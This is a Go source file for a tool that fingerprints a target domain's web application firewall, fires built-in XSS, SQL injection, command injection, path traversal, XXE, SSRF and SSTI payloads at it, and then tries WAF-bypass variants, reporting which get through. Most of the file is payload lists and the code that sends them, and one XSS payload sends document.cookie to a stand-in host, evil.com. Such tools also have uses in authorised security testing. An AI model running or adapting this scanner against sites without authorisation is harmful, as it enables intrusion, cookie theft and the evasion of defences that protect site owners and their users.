package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type Output struct {
	Success       bool          `json:"success"`
	Domain        string        `json:"domain"`
	WAFs          []WAFResult   `json:"wafs"`
	PayloadTests  []PayloadTest `json:"payloadTests"`
	Bypasses      []Bypass      `json:"bypasses"`
	RawHeaders    map[string]string `json:"rawHeaders"`
	Error         string        `json:"error,omitempty"`
}

type WAFResult struct {
	Name       string   `json:"name"`
	Confidence string   `json:"confidence"` // high, medium, low
	Evidence   []string `json:"evidence"`
	Vendor     string   `json:"vendor"`
}

type PayloadTest struct {
	Name      string `json:"name"`
	Payload   string `json:"payload"`
	Category  string `json:"category"` // xss, sqli, rce, lfi, etc
	Blocked   bool   `json:"blocked"`
	Status    int    `json:"statusCode"`
	BodySnip  string `json:"bodySnippet"`
}

type Bypass struct {
	Technique   string `json:"technique"`
	Description string `json:"description"`
	Category    string `json:"category"`
	Payload     string `json:"payload"`
	Blocked     bool   `json:"blocked"`
	Status      int    `json:"statusCode"`
}

var client = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        50,
		MaxIdleConnsPerHost: 10,
		DialContext:         (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
	},
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 3 { return http.ErrUseLastResponse }
		return nil
	},
}

func main() {
	domain := flag.String("domain", "", "Target domain")
	flag.Parse()
	if *domain == "" { fail("Domain is required") }

	d := strings.TrimSpace(*domain)
	d = strings.TrimPrefix(d, "http://")
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimRight(d, "/")

	baseURL := "https://" + d
	result := Output{Success: true, Domain: d, RawHeaders: map[string]string{}}

	// PHASE 1: Passive detection from normal request
	normalResp := doRequest(baseURL, "")
	if normalResp == nil { fail("Cannot reach " + d) }
	for k, v := range normalResp.headers { result.RawHeaders[k] = v }

	// PHASE 2: Trigger WAF with malicious payload
	triggerResp := doRequest(baseURL+"/?q=<script>alert(1)</script>&id=1'+OR+1=1--&cmd=;cat+/etc/passwd", "")
	blockedResp := doRequest(baseURL+"/etc/passwd../../../../../../etc/passwd", "")

	// PHASE 3: Fingerprint WAFs
	result.WAFs = detectWAFs(normalResp, triggerResp, blockedResp, d)

	// PHASE 4: Test payloads
	result.PayloadTests = testPayloads(baseURL, normalResp)

	// PHASE 5: Try bypass techniques
	result.Bypasses = tryBypasses(baseURL, normalResp, result.WAFs)

	out, _ := json.Marshal(result)
	fmt.Println(string(out))
}

func fail(msg string) {
	out, _ := json.Marshal(Output{Success: false, Error: msg})
	fmt.Println(string(out))
	os.Exit(1)
}

type httpResp struct {
	status  int
	headers map[string]string
	body    string
	cookies []string
}

func doRequest(url, ua string) *httpResp {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil { return nil }
	if ua == "" { ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")

	resp, err := client.Do(req)
	if err != nil { return nil }
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	resp.Body.Close()

	headers := map[string]string{}
	for k := range resp.Header { headers[strings.ToLower(k)] = resp.Header.Get(k) }

	var cookies []string
	for _, c := range resp.Cookies() { cookies = append(cookies, c.Name+"="+c.Value) }

	return &httpResp{status: resp.StatusCode, headers: headers, body: string(body), cookies: cookies}
}

func detectWAFs(normal, trigger, blocked *httpResp, domain string) []WAFResult {
	var wafs []WAFResult
	allResps := []*httpResp{normal, trigger, blocked}

	for _, waf := range wafSignatures() {
		var headerEvidence []string
		var bodyEvidence []string
		var cookieEvidence []string
		hasHardEvidence := false // header or cookie match = hard evidence

		for _, r := range allResps {
			if r == nil { continue }
			// Check headers (strongest signal)
			for _, sig := range waf.headerSigs {
				for k, v := range r.headers {
					if matchSig(k, sig) || matchSig(v, sig) {
						headerEvidence = append(headerEvidence, fmt.Sprintf("Header: %s=%s", k, truncate(v, 80)))
						hasHardEvidence = true
					}
				}
			}
			// Check cookies (strong signal)
			for _, sig := range waf.cookieSigs {
				for _, c := range r.cookies {
					if matchSig(c, sig) {
						cookieEvidence = append(cookieEvidence, fmt.Sprintf("Cookie: %s", truncate(c, 60)))
						hasHardEvidence = true
					}
				}
			}
			// Check body (only if it's a specific WAF signature, not generic)
			for _, sig := range waf.bodySigs {
				if matchSig(r.body, sig) {
					bodyEvidence = append(bodyEvidence, fmt.Sprintf("Body contains: %s", sig))
				}
			}
		}

		// RULE: Only report a WAF if we have hard evidence (headers or cookies)
		// Body-only matches are too prone to false positives
		// Status code alone is NEVER evidence
		if !hasHardEvidence {
			continue
		}

		var allEvidence []string
		allEvidence = append(allEvidence, headerEvidence...)
		allEvidence = append(allEvidence, cookieEvidence...)
		allEvidence = append(allEvidence, bodyEvidence...)

		confidence := "medium"
		if len(headerEvidence) > 0 && len(cookieEvidence) > 0 {
			confidence = "high"
		} else if len(headerEvidence) >= 2 {
			confidence = "high"
		}

		wafs = append(wafs, WAFResult{
			Name: waf.name, Confidence: confidence,
			Evidence: unique(allEvidence), Vendor: waf.vendor,
		})
	}
	return wafs
}

func testPayloads(baseURL string, normalResp *httpResp) []PayloadTest {
	normalLen := 0
	normalStatus := 200
	if normalResp != nil {
		normalLen = len(normalResp.body)
		normalStatus = normalResp.status
	}

	tests := []struct {
		name, category, payload string
	}{
		// XSS
		{"Basic XSS", "xss", "?q=<script>alert(1)</script>"},
		{"IMG XSS", "xss", "?q=<img src=x onerror=alert(1)>"},
		{"SVG XSS", "xss", "?q=<svg onload=alert(1)>"},
		{"Event Handler", "xss", "?q=<div onmouseover=alert(1)>"},
		{"JavaScript URI", "xss", "?q=javascript:alert(1)"},
		{"Data URI", "xss", "?q=data:text/html,<script>alert(1)</script>"},
		{"Template Injection", "xss", "?q={{7*7}}"},
		{"Angular XSS", "xss", "?q={{constructor.constructor('alert(1)')()}}"},
		// SQLi
		{"Basic SQLi", "sqli", "?id=1'+OR+1=1--"},
		{"Union SQLi", "sqli", "?id=1+UNION+SELECT+1,2,3--"},
		{"Boolean SQLi", "sqli", "?id=1+AND+1=1"},
		{"Time SQLi", "sqli", "?id=1+AND+SLEEP(5)--"},
		{"Error SQLi", "sqli", "?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"},
		{"Stacked Query", "sqli", "?id=1;SELECT+1--"},
		// RCE
		{"Command Injection", "rce", "?cmd=;id"},
		{"Pipe Command", "rce", "?cmd=|cat+/etc/passwd"},
		{"Backtick RCE", "rce", "?cmd=`id`"},
		{"$(cmd)", "rce", "?cmd=$(id)"},
		// LFI/RFI
		{"Path Traversal", "lfi", "?file=../../../etc/passwd"},
		{"Null Byte LFI", "lfi", "?file=../../../etc/passwd%00"},
		{"Double Encoding", "lfi", "?file=%252e%252e%252f%252e%252e%252fetc/passwd"},
		{"PHP Filter", "lfi", "?file=php://filter/convert.base64-encode/resource=index.php"},
		// XXE
		{"XXE Probe", "xxe", "?xml=<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]>"},
		// SSRF
		{"SSRF localhost", "ssrf", "?url=http://127.0.0.1"},
		{"SSRF metadata", "ssrf", "?url=http://169.254.169.254/latest/meta-data/"},
		// SSTI
		{"Jinja2 SSTI", "ssti", "?q={{config.items()}}"},
		{"Twig SSTI", "ssti", "?q={{_self.env.display('id')}}"},
	}

	var results []PayloadTest
	for _, t := range tests {
		r := doRequest(baseURL+"/"+t.payload, "")
		blocked := false
		status := 0
		bodySnip := ""
		if r != nil {
			status = r.status
			bodySnip = truncate(r.body, 200)
			// Determine if blocked
			if r.status == 403 || r.status == 406 || r.status == 429 || r.status == 503 {
				blocked = true
			} else if normalStatus == 200 && r.status != 200 {
				blocked = true
			} else if normalLen > 0 && abs(len(r.body)-normalLen) > normalLen/2 {
				// Significant size difference = likely blocked/modified
				blocked = isBlockPage(r.body)
			}
		} else {
			blocked = true
			status = 0
		}

		results = append(results, PayloadTest{
			Name: t.name, Payload: t.payload, Category: t.category,
			Blocked: blocked, Status: status, BodySnip: bodySnip,
		})
	}
	return results
}

func tryBypasses(baseURL string, normalResp *httpResp, wafs []WAFResult) []Bypass {
	normalLen := 0
	if normalResp != nil { normalLen = len(normalResp.body) }

	bypasses := []struct {
		technique, desc, category, payload string
	}{
		// XSS Bypasses
		{"Case Variation", "Mixed case to bypass regex filters", "xss", "?q=<ScRiPt>alert(1)</ScRiPt>"},
		{"Double Encoding", "URL double-encode to bypass single-decode filters", "xss", "?q=%253Cscript%253Ealert(1)%253C/script%253E"},
		{"Unicode Escape", "Unicode encoding bypass", "xss", "?q=<script>\\u0061lert(1)</script>"},
		{"HTML Entity", "HTML entity encoding", "xss", "?q=&#60;script&#62;alert(1)&#60;/script&#62;"},
		{"Null Byte Insert", "Null bytes to confuse parsers", "xss", "?q=<scr%00ipt>alert(1)</scr%00ipt>"},
		{"Tab/Newline Break", "Whitespace to break pattern matching", "xss", "?q=<script%09>alert(1)</script>"},
		{"SVG/OnLoad", "SVG tag often not filtered", "xss", "?q=<svg/onload=alert(1)>"},
		{"IMG Onerror", "Event without script tags", "xss", "?q=<img+src=x+onerror=prompt(1)>"},
		{"Details/Open", "Details tag rarely filtered", "xss", "?q=<details+open+ontoggle=alert(1)>"},
		{"Body Onload", "Body tag event handler", "xss", "?q=<body+onload=alert(1)>"},
		{"Iframe SrcDoc", "Iframe with srcdoc attribute", "xss", "?q=<iframe+srcdoc='<script>alert(1)</script>'>"},
		{"Math XSS", "MathML based XSS", "xss", "?q=<math><mtext><table><mglyph><style><!--</style><img+src=x+onerror=alert(1)>"},
		{"Eval Concat", "String concatenation to avoid keyword detection", "xss", "?q=<script>eval('al'+'ert(1)')</script>"},
		{"Constructor", "Constructor-based execution", "xss", "?q=<script>[].constructor.constructor('alert(1)')()</script>"},
		{"Fetch API", "Modern API-based exfil", "xss", "?q=<script>fetch('//evil.com?c='+document.cookie)</script>"},
		// SQLi Bypasses
		{"Comment Bypass", "Inline comments to break keywords", "sqli", "?id=1'+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--"},
		{"Case + Comment", "Mixed case with comments", "sqli", "?id=1'+UnIoN/**/SeLeCt/**/1,2,3--"},
		{"No Space", "Replace spaces with comments", "sqli", "?id=1'/**/OR/**/1=1--"},
		{"Double URL Encode", "Double encode special chars", "sqli", "?id=1%2527+OR+1%253D1--"},
		{"Hex Encoding", "Hex encode strings", "sqli", "?id=1+UNION+SELECT+0x61646d696e--"},
		{"Char Concat", "CHAR() to avoid string detection", "sqli", "?id=1+UNION+SELECT+CHAR(97,100,109,105,110)--"},
		{"Buffer Overflow", "Long string to overflow WAF buffer", "sqli", "?id=1+AND+1=1" + strings.Repeat("+", 2000) + "+UNION+SELECT+1--"},
		{"JSON SQLi", "JSON syntax for SQLi", "sqli", "?json={\"id\":\"1' OR '1'='1\"}"},
		{"HPP SQLi", "HTTP Parameter Pollution", "sqli", "?id=1&id='+OR+1=1--"},
		// LFI Bypasses
		{"Double Dot Bypass", "....// to bypass ../ filter", "lfi", "?file=....//....//....//etc/passwd"},
		{"UTF-8 Encoding", "UTF-8 encoded traversal", "lfi", "?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
		{"Path Normalization", "Windows-style paths on Linux", "lfi", "?file=..\\..\\..\\etc\\passwd"},
		// Header Bypasses
		{"X-Forwarded-For", "Spoof internal IP via header", "header", ""},
		{"X-Original-URL", "Override path for access control bypass", "header", ""},
	}

	var results []Bypass
	for _, b := range bypasses {
		if b.payload == "" { continue } // skip header-only bypasses
		r := doRequest(baseURL+"/"+b.payload, "")
		blocked := true
		status := 0
		if r != nil {
			status = r.status
			if r.status == 200 && normalLen > 0 && abs(len(r.body)-normalLen) < normalLen/3 {
				blocked = false
			}
			if r.status == 200 && !isBlockPage(r.body) {
				blocked = false
			}
		}

		results = append(results, Bypass{
			Technique: b.technique, Description: b.desc, Category: b.category,
			Payload: b.payload, Blocked: blocked, Status: status,
		})
	}
	return results
}

func isBlockPage(body string) bool {
	lower := strings.ToLower(body)
	indicators := []string{
		"access denied", "forbidden", "blocked", "firewall",
		"waf", "security", "attack detected", "not acceptable",
		"request blocked", "web application firewall",
		"cloudflare", "incapsula", "sucuri", "akamai",
		"you have been blocked", "suspicious activity",
		"your request has been blocked", "bot detection",
	}
	for _, ind := range indicators {
		if strings.Contains(lower, ind) { return true }
	}
	return false
}

type wafSig struct {
	name       string
	vendor     string
	headerSigs []string
	bodySigs   []string
	cookieSigs []string
	statusCheck int
}

func wafSignatures() []wafSig {
	return []wafSig{
		{"Cloudflare", "Cloudflare Inc.", []string{"cf-ray", "cf-cache-status", "cf-request-id"}, []string{"attention required! | cloudflare", "cloudflare ray id", "cloudflare to restrict access"}, []string{"__cfduid", "__cf_bm", "cf_clearance"}, 403},
		{"Akamai", "Akamai Technologies", []string{"akamaighost", "x-akamai-transformed", "x-akamai-request-id"}, []string{"reference #", "akamai ghost"}, []string{"ak_bmsc", "bm_sz", "bm_sv"}, 403},
		{"AWS WAF", "Amazon Web Services", []string{"x-amzn-waf", "x-amzn-requestid"}, []string{"request blocked by aws waf"}, []string{"awsalb", "awsalbcors"}, 403},
		{"AWS CloudFront", "Amazon Web Services", []string{"x-amz-cf-id", "x-amz-cf-pop"}, []string{}, []string{}, 0},
		{"AWS Shield", "Amazon Web Services", []string{"x-amzn-waf"}, []string{}, []string{}, 403},
		{"AWS ELB", "Amazon Web Services", []string{"awselb"}, []string{}, []string{"awselb"}, 0},
		{"Imperva Incapsula", "Imperva", []string{"x-iinfo"}, []string{"powered by incapsula", "incident id"}, []string{"incap_ses", "visid_incap", "nlbi_"}, 403},
		{"Sucuri", "GoDaddy/Sucuri", []string{"x-sucuri-id", "x-sucuri-cache"}, []string{"sucuri website firewall", "access denied - sucuri", "cloudproxy"}, []string{"sucuri_cloudproxy"}, 403},
		{"F5 BIG-IP ASM", "F5 Networks", []string{"x-wa-info", "bigipserver"}, []string{"the requested url was rejected", "please consult with your administrator"}, []string{"bigipserver", "f5_cspm"}, 403},
		{"Barracuda", "Barracuda Networks", []string{"barra_counter_session"}, []string{"barracuda networks"}, []string{"barra_counter_session"}, 403},
		{"Fortinet FortiWeb", "Fortinet", []string{"fortiwafsid"}, []string{".fgd_icon", "fortigate application"}, []string{"fortiwafsid", "cookiesession1"}, 403},
		{"ModSecurity", "Trustwave/OWASP", []string{"mod_security", "modsecurity"}, []string{"this error was generated by mod_security"}, []string{}, 403},
		{"Wordfence", "Defiant/Wordfence", []string{"wordfence"}, []string{"generated by wordfence", "a potentially unsafe operation has been detected"}, []string{"wfwaf-authcookie"}, 403},
		{"Comodo WAF", "Comodo", []string{"x-cwaf"}, []string{"protected by comodo"}, []string{}, 403},
		{"DenyAll", "Rohde & Schwarz", []string{"denyall"}, []string{"conditionblocked", "denyall"}, []string{"sessioncookie"}, 403},
		{"SiteLock", "SiteLock", []string{"sitelock"}, []string{"sitelock", "sitelock incident id"}, []string{}, 403},
		{"Palo Alto", "Palo Alto Networks", []string{"x-pan"}, []string{"has been blocked", "threat prevention", "palo alto"}, []string{}, 403},
		{"Citrix NetScaler", "Citrix", []string{"ns_af", "citrix_ns_id", "nsvpx", "ns-cache"}, []string{"ns_af", "citrix", "netscaler"}, []string{"citrix_ns_id", "ns_af", "ns_s"}, 403},
		{"Wallarm", "Wallarm", []string{"wallarm"}, []string{"wallarm"}, []string{}, 403},
		{"Reblaze", "Reblaze", []string{"rbzid", "reblaze"}, []string{"reblaze", "access denied (403)"}, []string{"rbzid"}, 403},
		{"Microsoft Azure WAF", "Microsoft", []string{"x-azure-ref", "x-ms-request-id"}, []string{"azure"}, []string{"x-ms"}, 403},
		{"Google Cloud Armor", "Google", []string{"x-goog"}, []string{"google cloud armor", "blocked by google"}, []string{}, 403},
		{"StackPath", "StackPath", []string{"x-sp", "stackpath"}, []string{"stackpath", "sp-"}, []string{"sp-"}, 403},
		{"Fastly", "Fastly", []string{"x-fastly-request-id", "fastly-io-info"}, []string{"fastly error"}, []string{}, 0},
		{"Varnish", "Varnish Software", []string{"x-varnish"}, []string{"guru meditation"}, []string{}, 0},
		{"Radware AppWall", "Radware", []string{"x-sl-compstate"}, []string{"radware", "unauthorized activity"}, []string{}, 403},
		{"DDoS-Guard", "DDoS-Guard", []string{"ddos-guard"}, []string{"ddos-guard"}, []string{"__ddg1", "__ddg2"}, 403},
		{"DataDome", "DataDome", []string{"x-datadome"}, []string{"datadome"}, []string{"datadome"}, 403},
		{"PerimeterX/HUMAN", "PerimeterX", []string{"x-px"}, []string{"perimeterx", "human challenge", "press & hold"}, []string{"_px", "_pxhd"}, 403},
		{"Kaspersky", "Kaspersky", []string{"kaspersky"}, []string{"kaspersky"}, []string{}, 403},
		{"ArvanCloud", "ArvanCloud", []string{"ar-real-ip", "ar-atime", "ar-poweredby"}, []string{"arvancloud"}, []string{"ar_token"}, 403},
	}
}

func matchSig(text, sig string) bool {
	return strings.Contains(strings.ToLower(text), strings.ToLower(sig))
}

func truncate(s string, max int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", "")
	if len(s) > max { return s[:max] + "..." }
	return s
}

func unique(s []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, v := range s {
		if !seen[v] { seen[v] = true; out = append(out, v) }
	}
	return out
}

func abs(x int) int { if x < 0 { return -x }; return x }
